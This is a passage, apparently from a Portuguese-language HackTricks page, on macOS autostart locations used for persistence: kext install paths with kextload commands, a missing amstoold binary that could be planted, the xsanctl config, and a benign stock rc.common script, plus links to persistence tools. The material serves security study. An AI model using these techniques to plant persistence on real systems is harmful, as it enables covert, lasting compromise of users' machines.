#### Descrição e Exploit

O XQuartz **não vem mais instalado no macOS**, portanto, para obter mais informações, consulte o writeup.

### ~~kext~~

> [!CAUTION]
> É tão complicado instalar um kext, mesmo como root, que não o considerarei para escapar de sandboxes ou mesmo para persistência (a menos que você tenha um exploit)

#### Localização

Para instalar um KEXT como item de inicialização, ele precisa ser **instalado em um dos seguintes locais**:

- `/System/Library/Extensions`
- Arquivos KEXT integrados ao sistema operacional OS X.
- `/Library/Extensions`
- Arquivos KEXT instalados por software de terceiros

Você pode listar os arquivos kext atualmente carregados com:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Para mais informações sobre [**kernel extensions, confira esta seção**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Localização

- **`/usr/local/bin/amstoold`**
- Requer root

#### Descrição e Exploitation

Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` usava esse binary enquanto expunha um serviço XPC... o problema é que o binary não existia, então era possível colocar algo nesse local e, quando o serviço XPC fosse chamado, o seu binary seria executado.

Não consigo mais encontrar isso no meu macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Localização

- **`/Library/Preferences/Xsan/.xsanrc`**
- Requer root
- **Trigger**: Quando o serviço é executado (raramente)

#### Descrição e exploit

Aparentemente, não é muito comum executar esse script e eu nem consegui encontrá-lo no meu macOS; portanto, se quiser mais informações, confira o writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Isso não funciona nas versões modernas do MacOS**

Também é possível colocar aqui **comandos que serão executados na inicialização.** Exemplo de um script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas e ferramentas de persistência

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referências

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
